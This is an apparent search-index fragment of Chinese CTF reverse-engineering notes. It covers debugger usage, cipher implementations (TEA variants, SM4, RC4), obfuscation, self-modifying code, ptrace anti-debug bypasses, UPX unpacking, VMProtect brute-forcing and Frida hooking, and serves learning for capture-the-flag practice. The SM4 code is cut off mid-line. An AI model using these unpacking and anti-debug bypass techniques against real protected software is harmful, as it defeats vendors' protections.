","date":"2024-10-09","objectID":"/reverse_note/:2:7","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"x64dbg 适用于32位和64位调试 反汇编显示区 寄存器显示区 内存数据显示区 栈显示区 运行到用户代码 点击 Az图标：查看字符串 循环箭头按键：为重新运行 右箭头按键：直接运行 快捷键： ctrl+G：跳转到目标地址/表达式 F2：下断点 F4：运行到光标位置 F7：单步步入 F8：单步步过 F9：运行 空格修改汇编代码 可以右键修改十六进制代码：修复错误时将字节改为90(nop) 可以对代码转到对应的内存空间位置：右键 \u003e 在内存布局中转到 搜索命令：右键 \u003e 所有用户模块 \u003e 命令，如寻找pushad ","date":"2024-10-09","objectID":"/reverse_note/:2:8","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"GDB/PWNDBG set var $寄存器 = expr #修改寄存器的值 set {type}address = expr #给存储在address地址的变量类型为type的变量赋值 Fin：运行当前函数直到结束 ","date":"2024-10-09","objectID":"/reverse_note/:2:9","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"UPXshell 在Windows下进行UPX脱壳 ","date":"2024-10-09","objectID":"/reverse_note/:2:10","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Jadx APK分析工具 获取反编译后的JAVA原码且可视化，能打开文件格式：.apk, .dex, .jar, .class, .smali, .zip, .aar, .ars ","date":"2024-10-09","objectID":"/reverse_note/:2:11","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"jd-gui 反编译jar包，获取JAVA源码 ","date":"2024-10-09","objectID":"/reverse_note/:2:12","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"ILSpy 用于dll文件的逆向，可以查看Program程序代码 ","date":"2024-10-09","objectID":"/reverse_note/:2:13","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Z3-Solver pip install -i ``https://pypi.tuna.tsinghua.edu.cn/simple`` z3-solver指定镜像源安装 一般输入的是字符串，但最终将字符串转换为了数值进行计算，最终获取数值还需要转换回字符串，注意参与计算的数值之间的顺序（小端序，如何输入） Linux下运行 from z3 import * from libnum import * # 定义变量 v1 = BitVec('v1', 64) v2 = BitVec('v2', 64) solver = Solver() # 加入表达式 solver.add((v1 \u0026 v2 ^ (v1 | ~(v1 + v2)) \u0026 v2 \u0026 v1) != 0xdeadbeef) if solver.check() == sat: result = solver.model() print(result) # 获取所有结果 v1_val = int(result[v1].as_long()) print(v1_val) # 获取单个结果 print(n2s(v1_val)[::-1]) # 逆序转换为字符串 ","date":"2024-10-09","objectID":"/reverse_note/:2:14","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"QEMU # 创建虚拟磁盘 qemu-img create -f raw hello.img 10G 运行riscv程序 sudo apt install qemu-user chmod +x ./elf qemu-riscv64 ./elf ","date":"2024-10-09","objectID":"/reverse_note/:2:15","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"算法 ","date":"2024-10-09","objectID":"/reverse_note/:3:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"TEA系列 均会使用特征值$\\delta$：0x9e3779b9，在IDA中可能使用补码表示：0x61c88647，可使用python： hex(0xffffffff - 0x61c88647 + 1) 得到 0x9e3779b9 TEA Tiny Encryption Algorithm，使用Feistel分组加密框架，64轮迭代，原文以8字节(64位)为一组，密钥16字节(128位)，具体实现过程： 汇编判断：花指令 mov ecx, xxx\rshl ecx, 4\radd ecx, xxx\rmov edx, xxx\radd edx, xxx\rxor ecx, edx\rmov eax, xxx\rshr eax, 5 加解密实现 #include \u003cstdint.h\u003e // 无论是64位还是32位都可以使用uint32_t //加密函数 void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; uint32_t delta=0x9e3779b9; // 固定值 uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i \u003c 32; i++) { // 实际64轮, 此处一次循环两轮 sum += delta; v0 += ((v1\u003c\u003c4) + k0) ^ (v1 + sum) ^ ((v1\u003e\u003e5) + k1); v1 += ((v0\u003c\u003c4) + k2) ^ (v0 + sum) ^ ((v0\u003e\u003e5) + k3); } v[0]=v0; v[1]=v1; } //解密函数 循环内颠倒顺序 void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; // sum是32次循环的delta之和 uint32_t delta=0x9e3779b9; uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i\u003c32; i++) { v1 -= ((v0\u003c\u003c4) + k2) ^ (v0 + sum) ^ ((v0\u003e\u003e5) + k3); v0 -= ((v1\u003c\u003c4) + k0) ^ (v1 + sum) ^ ((v1\u003e\u003e5) + k1); sum -= delta; } v[0]=v0; v[1]=v1; } int main() { // 短数据加解密 uint32_t v[2]={1,2},k[4]={2,2,3,4}; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(\"加密前原始数据：%u %u\\n\",v[0],v[1]); encrypt(v, k); printf(\"加密后的数据：%u %u\\n\",v[0],v[1]); decrypt(v, k); printf(\"解密后的数据：%u %u\\n\",v[0],v[1]); // 长数据加解密 char data[] = \"password123456789\"; uint32_t key[] = {0x11111111,0x22222222,0x33333333,0x44444444}; for (size_t i = 0; i \u003c strlen(data)/8; i++) encrypt((uint32_t*)\u0026data[i*8], key); printf(\"加密后：%s\\n\", data); for (size_t i = 0; i \u003c strlen(data)/8; i++) decrypt((uint32_t*)\u0026data[i*8], key); printf(\"解密后：%s\\n\", data); return 0; } XTEA Delta值可以更改，tea取 key 的时候是固定下标取的，现在通过计算取 #include\u003cstdio.h\u003e #include\u003cstdint.h\u003e void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){ unsigned int i; uint32_t v0=v[0],v1=v[1],sum=0,delta=0x9E3779B9; for(i=0;i\u003cnum_rounds;i++){ v0+=(((v1\u003c\u003c4)^(v1\u003e\u003e5))+v1)^(sum+key[sum\u00263]); sum+=delta; v1+=(((v0\u003c\u003c4)^(v0\u003e\u003e5))+v0)^(sum+key[(sum\u003e\u003e11)\u00263]); } v[0]=v0;v[1]=v1; } void decipher(unsigned int num_rounds,uint32_t v[2],uint32_t const key[4]){ unsigned int i; uint32_t v0=v[0],v1=v[1],delta=0x9E3779B9,sum=delta*num_rounds; for(i=0;i\u003cnum_rounds;i++){ v1-=(((v0\u003c\u003c4)^(v0\u003e\u003e5))+v0)^(sum+key[(sum\u003e\u003e11)\u00263]); sum-=delta; v0-=(((v1\u003c\u003c4)^(v1\u003e\u003e5))+v1)^(sum+key[sum\u00263]); } v[0]=v0;v[1]=v1; } int main(){ // 输入十六进制, 可能需要倒序2个2个输入如: 0x12345678 , 用 0x78563412 输入 uint32_t v[2]={1,2}; uint32_t const k[4]={2,2,3,4}; unsigned int r=32; //这里是加密轮数，自己设置 printf(\"加密前原始数据：%u %u\\n\",v[0],v[1]); // 更改为%x显示十六进制 encipher(r,v,k); printf(\"加密后原始数据：%u %u\\n\",v[0],v[1]); decipher(r,v,k); printf(\"解密后原始数据：%u %u\\n\",v[0],v[1]); // 字符ASCII范围 \u003c 0x7f | 127 return 0; } XXTEA 原字符串长度可以不是4的倍数，明文分成若干固定长度块，每个块加密后，拼接 #include \u003cstdio.h\u003e #include \u003cstdint.h\u003e #define DELTA 0x9e3779b9 #define MX (((z \u003e\u003e 5 ^ y \u003c\u003c 2) + (y \u003e\u003e 3 ^ z \u003c\u003c 4)) ^ ((sum ^ y) + (key[(p \u0026 3) ^ e] ^ z))) // 混淆操作, 密码学扩散原理, xxtea特征 void xxtea(uint32_t *v, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; // 加密 if (n \u003e 1){ rounds = 6 + 52 / n; // 循环轮数 sum = 0; z = v[n - 1]; do{ sum += DELTA; e = (sum \u003e\u003e 2) \u0026 3;// e: sum\u003e\u003e2 for (p = 0; p \u003c n - 1; p++){ y = v[p + 1]; z = v[p] += MX; // 本质上还是双整形加密,用v[p]和v[p+1]对v[p]加密 // v[p] += MX; // z = v[p]; } y = v[0]; z = v[n - 1] += MX; // 一轮加密的最后用v[n-1]和v[0]对v[n-1]加密 } while (--rounds); } // 解密 else if (n \u003c -1){ n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do{ e = (sum \u003e\u003e 2) \u0026 3; for (p = n - 1; p \u003e 0; p--){ z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main(){ uint32_t v[2] = {1, 2}; uint32_t const k[4] = {2, 0, 2, 4}; // 128位 int n = 2;// n的绝对值为v长度，取正表示加密，取负表示解密 printf(\"%#10x %#10x\\n\", v[0], v[1]); xxtea(v, n, k); // n\u003e0为加密 printf(\"%#10x %#10x\\n\", v[0], v[1]); xxtea(v, -n, k); // n\u003c0为解密 printf(\"%#10x %#10x\\n\", v[0], v[1]); return 0; } ","date":"2024-10-09","objectID":"/reverse_note/:3:1","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"md5 有4个固定的32bit值 ","date":"2024-10-09","objectID":"/reverse_note/:3:2","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"SM4 分组密码，4组，分组长度128位，密钥长度128位，加解密算法相同，轮密钥使用次序相反，32轮非线性迭代 轮密钥 rK 有32个，32位为单位，每一次迭代为一轮F函数 $X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rK_i)=X_i ⊕ T( X_{i+1}⊕X_{i+2}⊕X_{i+3}⊕rK_i)$ F函数中的T函数 T：合成置换，可逆变换，由非线性变换$\\tau$和线性变换$L$复合而成：$T()=L(\\tau())$ 非线性变换 A 到 B，A 和 B 均为32位，$\\tau$由4个并行S盒构成【固定的256字节的数组】 $B =（b_0,b_1,b_2,b_3）= τ(A)=(Sbox(a_0),Sbox(a_0),Sbox(a_0),Sbox(a_0))$ 查表规则：有 F 行 F 列，输入的32位可表示为2个十六进制数，一个做行一个做列找值替换 线性变换 B 到 C，均为32位，此处为循环左移 $C = L(B) = B ⊕(B«\u003c2)⊕(B«\u003c10) ⊕(B«\u003c18) ⊕(B«\u003c24)$ 轮密钥扩展 密钥128位，$MK=(MK_0,MK_1,MK_2,MK_3)$，轮密钥由密钥生成 系统参数：$FK=(FK_0,FK_1,FK_2,FK_3)$，固定参数：$CK=(CK_0,CK_1,\\cdots ,CK_{31})$ $(K_0,K_1,K_2,K_3)= (MK_0⊕FK_0, MK_1⊕, FK_1, MK_2⊕FK_2, MK_3⊕FK_3)$ $rK_i=K_{i+4}=K_i⊕T’(K_{i+1}⊕K_{i+2}⊕K_{i+3}⊕CK_i)\\quad\\quad [i=0,\\cdots,31]$ $T’$即将 $T$ 中的 $L$ 替换为 $L’$：$L’(B)=B\\oplus (B\\lt\\lt\\lt 13)\\oplus(B\\lt\\lt\\lt 23)$ 解密 由于$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3~}rK_i)=X_i ⊕ T( X_{i+1}⊕X_{i+2}⊕X_{i+3}⊕rK_i)$ 所以$X_i=F(X_{i+4},X_{i+1},X_{i+2},X_{i+3},rK_i)=X_{i+4} ⊕ T(X_{i+1}⊕X_{i+2}⊕X_{i+3}⊕rK_i)$ 将密文逆序，轮密钥也逆序，解密流程即加密流程的逆序 源代码链接借鉴：https://cloud.tencent.com/developer/article/2158867 #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #define u8 unsigned char #define u32 unsigned long /******************************定义系统参数FK的取值****************************************/ const u32 TBL_SYS_PARAMS[4] = {0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc}; /******************************定义固定参数CK的取值****************************************/ const u32 TBL_FIX_PARAMS[32] = { 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279}; /******************************SBox参数列表****************************************/ const u8 TBL_SBOX[256] = { 0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05, 0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62, 0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6, 0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8, 0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35, 0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87, 0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e, 0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1, 0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3, 0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f, 0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51, 0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8, 0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0, 0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84, 0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}; // 4字节无符号数组转无符号long型 void four_uCh2uLong(u8 *in, u32 *out){ int i = 0; *out = 0; for (i = 0; i \u003c 4; i++) *out = ((u32)in[i] \u003c\u003c (24 - i * 8)) ^ *out; } // 无符号long型转4字节无符号数组 void uLong2four_uCh(u32 in, u8 *out){ int i = 0; // 从32位unsigned long的高位开始取 for (i = 0; i \u003c 4; i++) *(out + i) = (u32)(in \u003e\u003e (24 - i * 8)); } // 左移，保留丢弃位放置尾部 u32 lmove(u32 data, int length){ u32 result = 0; result = (data \u003c\u003c length) ^ (data \u003e\u003e (32 - length)); return result; } // 秘钥处理函数,先使用Sbox进行非线性变化，再将线性变换L置换为L' u3","date":"2024-10-09","objectID":"/reverse_note/:3:3","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"RC4 对称加密算法，包括初始化算法（KSA)和加密算法 初始化过程 #include\u003cstdio.h\u003e void rc4_init(unsigned char*S, unsigned char*key, unsigned long Len) { int i = 0; char T[256] = { 0 }; unsigned char tmp = 0; // 初始化 S 和 T for (i = 0; i \u003c 256; i++){ S[i] = i; T[i] = key[i%Len]; // Len 为 key 的长度 } // 初始排列 S int j = 0; for (i = 0; i \u003c 256; i++) { j = (j + S[i] + T[i]) % 256; // 开始混淆 tmp = S[i]; S[i] = S[j]; // 交换s[i]和s[j] S[j] = tmp; } } 加解密过程 void rc4_crypt(unsigned char*S, unsigned char*Data, unsigned long Len_Data) { // 加解密同一函数 int i = 0, j = 0, t = 0; unsigned long k = 0; // 明文索引 unsigned char tmp; for (k = 0; k \u003c Len_Data; k++) // Len 明文长度 { // 生成密钥流，利用密钥流和明文进行加密 i = (i + 1) % 256; j = (j + S[i]) % 256; tmp = S[i]; S[i] = S[j]; // 交换 S[x] 和 S[y] S[j] = tmp; t = (S[i] + S[j]) % 256; Data[k] ^= S[t]; // S_box 和明文 xor 加密 } } 调用 int main(){ // system(\"chcp 65001\"); // 防止终端乱码 unsigned char S[256]={0}; // S_box unsigned char key[]= \"xxxxxx\"; // char key[256] = {0} // scanf(\"%s\",key); // 赋值： unsigned __int8 data[] = {27, 155, 251, 25, 6, 106}; unsigned char data[] = {0xa7, 0x11}; // scanf(\"%s\",data); // unsigned long length = strlen(key); unsigned long length = sizeof(key) - 1; unsigned long data_size = sizeof(data); rc4_init(S,key,length); rc4_crypt(S,data,data_size); printf(\"%s\",data); return 0; } CyberChef input: 0xA7, 0x1A, 0x11\r# Find/Replace , {Global match, Case insensitive, Dot matches all}\r# Find/Replace \\n {Global match, Case insensitive, Dot matches all}\r# From Hex Auto\r# RC4 python from Crypto.Cipher import ARC4 def rc4_decrypt(ciphertext): key = b'flag.fromserver' rc4 = ARC4.new(key) decrypted_data = rc4.decrypt(ciphertext) return decrypted_data ","date":"2024-10-09","objectID":"/reverse_note/:3:4","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"DES ","date":"2024-10-09","objectID":"/reverse_note/:3:5","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Base算法 密码+编码 base64 基于64个可打印字符来表示二进制数据，6个bit为一个单元 ","date":"2024-10-09","objectID":"/reverse_note/:3:6","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"代码混淆 ","date":"2024-10-09","objectID":"/reverse_note/:4:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"脏字节 在汇编中加入db 232 ","date":"2024-10-09","objectID":"/reverse_note/:4:1","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"花指令 mov eax, $\radd eax, 12\rjmp eax ;跳转到寄存器中的地址 需要在汇编查看可疑跳转，IDA F5无法看出 ","date":"2024-10-09","objectID":"/reverse_note/:4:2","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"SMC技术 Self Modifying Code：自解码代码，程序中的部分代码加密，并插入解密代码，当程序需要运行源代码时，调用解密函数解密该部分代码，再跳转执行，阻止静态分析 Windows // API函数，允许应用程序改变内存页的保护属性 BOOL VirtualProtect( LPCVOID lpAddress, // 内存页起始地址 SIZE_T dwSize, // 内存页大小 DWORD flNewProtect, // 新保护属性 PAGE_EXECUTE_READWRITE=0x40 PDWORD lpfloldProtect // 存储旧的保护属性 }; VirtualProtect((char *)\u0026loc_401040, 0xCCu, 0x40u, (PDWORD)(v)); // 使得401040开始0xcc的内存可读可写可执行 修改会在IDA中发现： __asm { outsd } __indword(0x98u); __asm { retf } *(a - 40), *(a - 36), *(a - 32) // 一般为四个字节当一个整型计算 IDAPython 操作：File \u003e Script command \u003e run import idc addr = 0xabcdef # 是开始操作的起始地址 for i in range(531): # 直接末尾地址-起始地址 b = get_bytes(addr + i, 1) idc.patch_byte(addr + i, ord(b) ^ 0x90) # 具体变化操作 IDC static xor(){ auto addr = 0xabcdef; auto i = 0; for(i=0;addr+i\u003c0xfedcba;i++){ PatchByte(addr+i,Byte(addr+i)^0x90); } } 动调解决 ","date":"2024-10-09","objectID":"/reverse_note/:4:3","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"反调试 函数声明 long ptrace(enum __ptrace_request requête, pid_t pid, void *addr, void *data); PTRACE_TRACEME: 子进程标记 PTRACE_ATTACH: 父进程附加 PTRACE_CONT: 继续执行 绕过：通过动态调试修改RIP直接跳到main函数 或 patch/nop反调试函数 ","date":"2024-10-09","objectID":"/reverse_note/:4:4","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"OLLVM Obfuscator-LLVM，原理：通过修改“LLVM-IR”完成，本质是一个LLVM-PASS——一套IR代码优化脚本 控制流平坦化 将基本控制流并列，由主分发器来决定执行顺序 指令替换 基本运算公式复杂化 混淆前: a=b+c \u003e\u003e 混淆后: a=b+r, a=a+c, a=a-r 混淆前: a=b|c \u003e\u003e 混淆后: a=(b\u0026c)|(b^c) //b, c均为整数时 虚假控制流 将原本顺序执行转为条件执行，条件为“永真式”导致不会执行虚假块，但IDA会进行控制流分析 永真式：(((x - 1) * x) \u0026 1) == 0 ","date":"2024-10-09","objectID":"/reverse_note/:4:5","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"maze 迷宫问题 内存中布置一张地图(#和*显示) 用户输入限制在少数几个字符范围内(方向w/s/a/d等) 一般只1个迷宫入口、1个迷宫出口(多走法时代价最小 —\u003e 算法问题) 迷宫初始化 rows, cols = 10, 10 array = [['0' for _ in range(cols)] for _ in range(rows)] 回溯算法 深度优先算法DFS：栈 广度优先算法BFS：队列 ","date":"2024-10-09","objectID":"/reverse_note/:5:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"DFS import sys # 设置递归深度 sys.setrecursionlimit(20000) # x行 y列 def check(map, x, y): # 检查是否为0 if (x \u003e= 0) and (x \u003c= max_x) and (y \u003e= 0) and (y \u003c= max_y): return map[x][y] == 0 else: return False def gen_nex(map, x, y): # 当前位置四周的情况 all_dir = [] if check(map, x - 1, y): all_dir.append((x - 1, y, 'w')) if check(map, x + 1, y): all_dir.append((x + 1, y, 's')) if check(map, x, y - 1): all_dir.append((x, y - 1, 'a')) if check(map, x, y + 1): all_dir.append((x, y + 1, 'd')) return all_dir def check_success(map, x, y): if x == 54 and y == 74: # 判断出口 return True else: return False def print_info(map, x, y, path, file_path): with open(file_path, 'a') as f: # 地图 for row in map: f.write(''.join(str(cell) for cell in row) + '\\n') f.write('\\n') # 用于分隔每次递归的地图 # 坐标 f.write(str(x) + \" \" + str(y)+'\\n') # 路径 f.write(path+\"\\n\") def dfs(maze, x, y, path): map = maze.copy() # 这里用将maze复制给map，避免修改掉原地图。 if x!=54 or y!=74: map[x][y] = 1 if check_success(map, x, y): # print_path(path, 'b.txt') return True next_point = gen_nex(map, x, y) for n in next_point: pathn = path + n[2] # 将all_dir列表中的元组的第三个值，即方向传给pathn print_info(map, x, y, pathn, 'a.txt') if dfs(map, n[0], n[1], pathn): # 这里开始递归 用all_dir的元组第一二个值和pathn作为参数，进行当前位置的又一次深度优先遍历 return True return False dfs(maze, 1, 1, \"begin:\") # 使用之后仍需要判断是否正确, 比如: dwds \u003e dd, dwwdss \u003e dd ","date":"2024-10-09","objectID":"/reverse_note/:5:1","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"壳 ","date":"2024-10-09","objectID":"/reverse_note/:6:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"压缩壳 UPX 开源、压缩壳，原文件需要40kb以上才能加壳，可通过strings查看UPX字符串 脱壳原理为ESP定律（即堆栈平衡定律），可以在linux中使用： upx -d file #进行脱壳 或在Windows下使用UPX shell直接解压缩，UPX shell解压缩可能导致文件无法运行 # 在upx目录下 脱壳 ./upx.exe -d file x96dbg：F8 \u003e 寄存器窗口 \u003e ESP \u003e 在内存窗口中转到 Ollydbg：只能调试32位 使用OD进行UPX手动脱壳 第一条指令一般为pushad，将寄存器值存入栈中，保存上下文 F8单步执行，此时寄存器ESP值发生改变 寄存器窗口 \u003e ESP \u003e HW break[ESP] 或 [数据窗口中跟随] 转到内存视图 \u003e 此处ESP地址设置断点-硬件访问 F9运行到断点处，上图003B750F的上一行为popad，当执行到popad时，将会恢复ESP，此时将会触发硬件断点，中断 发现一个大跳转jmp UPX，于是F4到jmp代码处 \u003e F8步入 出现了正常的函数开头和结尾，即找到OEP 进行dump完成脱壳： 插件 \u003e OllyDump \u003e 脱壳在当前调试的进程 \u003e 获取EIP作为OEP \u003e 脱壳【由于不是windows XP会失败】 右键 \u003e 用OllyDump脱壳调试进程 \u003e 脱壳 x64dbg+手动脱壳 打开文件先查看系统断点，F9运行进入断点处，有多个push操作 ","date":"2024-10-09","objectID":"/reverse_note/:6:1","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"加密壳 VMP dll中加入了VMP壳：VMProtect 爆破脚本：爆破exe文件 #include\u003ciostream\u003e #include\u003cWindows.h\u003e void BF(){ HMODULE h = NULL; h = LoadLibraryA(\"xx.dll\"); typedef int(*func_in_dll)(char*, size_t); char* flag = (char*)malloc(16); // 15内容+'\\0' // 初始化 flag[0] = 'x'; flag[15] = '\\0'; func_in_dll func = (func_in_dll)GetProcAddress(h, \"func_in_dll\"); // 爆破 ... if(func(flag, 15)){ printf(\"%s\\n\", flag); return; } CloseHandle(h); } ","date":"2024-10-09","objectID":"/reverse_note/:6:2","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"脱壳 单步跟踪寻找OEP（original entry point，原始入口点），寻找大型跳转 ","date":"2024-10-09","objectID":"/reverse_note/:7:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"API定位 Microsoft Visual C/C++ 6 VC6写的代码，直接定位到GetVersion下断点 x64dbg中：视图 \u003e 模块，GetVersion在Kernel32.dll中，运行，在栈中找调用函数 OEP在GetVersion上文 ","date":"2024-10-09","objectID":"/reverse_note/:7:1","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"ESP定律 od载入程序有pushad指令可用其脱壳 ","date":"2024-10-09","objectID":"/reverse_note/:7:2","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Windows API 堆API HeapCreate(flOptions, dwInitialSize, dwMaximumSize) // 堆分配选项, 堆的初始大小, 堆的最大大小 HeapAlloc(hHeap, dwFlags, dwBytes) // 指向堆的句柄, 堆分配选项, 分配字节数 HeapFree(hHeap, dwFlags, lpMem) // 释放的堆的句柄, 堆释放选项, 指向要释放内存块的指针 HeapDestroy(hHeap) // 销毁的堆的句柄 用户API MessageBoxA(hWnd, lpText, lpCaption, uType) // 消息框所有者窗口的句柄, 显示信息, 对话框标题, 对话框内容和行为(中止,重试,忽略,确认,取消) 调试API IsDebuggerPresent() // 当前进程在调试器上下文中运行，返回非0; 否则为0 调用库API libr = LoadLibraryA(\"xxx.dll\"); // 将指定模块加载到调用进程地址空间 addr = GetProcAddress(libr, \"fun_or_vari\"); // 从指定动态链接库dll导入函数或变量地址 CloseHandle(libr); // 关闭对象的有效句柄 ","date":"2024-10-09","objectID":"/reverse_note/:8:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"安卓 jadx打开文件后，AndroidManifest.xml文件中包括配置信息等 APK文件若PC模拟器无法打开，则直接尝试手机安装打开，版本问题 ","date":"2024-10-09","objectID":"/reverse_note/:9:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"python Cython whl文件格式xxx-1.14-cp312-cp312-win_amd64中cp312表示python的版本：python-3.12，需要使用对应的python版本进行安装 pythonx -m pip install xxx.whl # 使用python指定的对应pip安装 import xxx # 安装后直接导入 help(xxx) # 可以查看信息 ","date":"2024-10-09","objectID":"/reverse_note/:10:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"VM 维护opcode操作码表模拟虚拟机操作，switch对于不同的码进行相应操作，一般来说都是对单字符进行处理，先使用IDA动态调试跟踪操作 Frida插桩测试 var number = 0 function main() { var base = Module.findBaseAddress( \"test.exe\" ) // 获取目标进程的基地址 // console.log( \"base:\" ,base) if (base){ Interceptor.attach(base.add( 0x1044 ), { // 该地址为opcode idx+1 onEnter: function(args) { number += 1 // 进行插桩 每当程序运行到该地址 number + = 1 } }); Interceptor.attach(base.add( 0x113f ), { // 结束 onEnter: function(args) { // send(number) // 配合python自动化脚本 console.log( \"end!\" ,number) } }); } } setImmediate(main); // 异步调用 